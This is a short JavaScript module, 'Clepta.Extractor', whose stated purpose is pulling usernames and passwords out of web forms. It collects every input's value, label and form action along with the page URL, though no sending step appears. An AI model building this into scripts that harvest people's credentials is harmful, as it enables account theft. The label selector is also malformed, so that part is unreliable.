// Make sure Clepta is defined
window.Clepta = window.Clepta || {};

/**
 * Extractor
 *
 * The extractor's job is to extract usernames and passwords from forms.
 */
Clepta.Extractor = function (forms) {
  this.forms = forms;

  /**
   * Retrieve a label for a given input from the given context.
   *
   * @return {String|null}
   */
  var getLabelForInput = function (context, input) {
    // If there is no id for this input, there is no label.
    if (typeof input.id === 'undefined') return null;

    // Get the label for the given input
    var label = context.querySelector('label[for="' + input.id + '"');
    if (typeof label === 'undefined') return null; // Return null if none found

    return label ? label.textContent || null : null;
  };

  /**
   * Extracts the date from the form in the current context.
   *
   * @return {Object}
   */
  this.extract = function () {
    return _.map(this.forms, function (form) {
      // Get all form inputs from the context's form
      var formInputs = form.querySelectorAll('input'),
          inputData = [];

      _.each(formInputs, function (input) {
        inputData.push({
          id: input.id || null,
          name: input.name || null,
          type: input.type || 'text',
          label: getLabelForInput(form, input) || null,
          placeholder: input.placeholder || null,
          value: input.value || null
        });
      });

      return {
        info: {
          method: (form.method || 'GET').toUpperCase(),
          action: (form.action || window.location.href),
          page: window.location.href
        },
        inputs: inputData
      };
    });
  };
};
